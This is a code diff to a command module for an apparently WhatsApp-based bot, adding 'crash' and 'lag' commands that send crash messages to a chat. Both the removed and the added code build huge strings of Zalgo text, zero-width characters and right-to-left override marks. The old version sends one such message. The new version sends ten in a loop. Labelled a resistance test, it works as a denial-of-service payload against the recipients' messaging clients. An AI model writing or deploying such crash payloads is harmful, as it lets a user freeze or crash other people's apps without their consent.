@@ -2,21 +2,26 @@ const { PREFIX } = require("../../krampus");
 
 module.exports = {
   name: "crash-test",
-  description: "Envía un mensaje diseñado para probar la resistencia del cliente.",
+  description: "Envía un mensaje lagger para probar la resistencia del cliente.",
   commands: ["crash", "lag"],
   usage: `${PREFIX}crash`,
   handle: async ({ socket, remoteJid }) => {
     try {
-      const krampusZalgo = "K̷̘͇̹͓̻͉̖͛͂͗̍̄̄̕͜͠Ȑ̸̘͓̲̺̖͕̞̺̞͎̗̱̓̄̍̓̓̋̍ͅA̵̡͕͇̲̳͓̞̥͎͙̞̍͗̿̎̓̏̐̈́̕̕͝͝M̶̨͓̠̙̟̪̞̘̩̱̖̗̟̈́͑̈́͂̋̽̇̋̽̚͘P̶̩̘̦̝̪̮̠̫̩̠͎͖̯͌̈́͐̎͒̏͋̐̆̾̓̋̿U̷̘̗͇͚̬̥̠̜͖̬̍̒̌̿̑͗̈́̿̈́̏̆̓͜͜͠S̴̛͓͔̦̮̼̝͉̈́́̎̏̾̀̾̒̅̓".repeat(70000);
-      const invisibles = "\u200B\u200C\u200D\u2060".repeat(10000);
-      const directionals = "\u202E\u202D".repeat(70000);
-      const emojis = "🦌".repeat(50000); // Cambiable por otros emojis según la prueba
+      // Configuración de la prueba
+      const lagStringLength = 50000; // Longitud del string lagger
+      const lagStringRepeat = 10; // Número de veces que se repite el string lagger
+      const delayBetweenMessages = 1000; // Retraso entre mensajes (en milisegundos)
 
-      const maliciousMessage = krampusZalgo + invisibles + directionals + emojis;
+      // Crear string lagger
+      const lagString = "\u200F\u200E\u202E".repeat(lagStringLength);
 
-      await socket.sendMessage(remoteJid, {
-        text: maliciousMessage,
-      });
+      // Enviar mensajes lagger
+      for (let i = 0; i < lagStringRepeat; i++) {
+        await socket.sendMessage(remoteJid, { text: lagString });
+        await new Promise(resolve => setTimeout(resolve, delayBetweenMessages));
+      }
+
+      console.log("Prueba de resistencia finalizada.");
     } catch (error) {
       console.error("Error en crash-test:", error);
     }
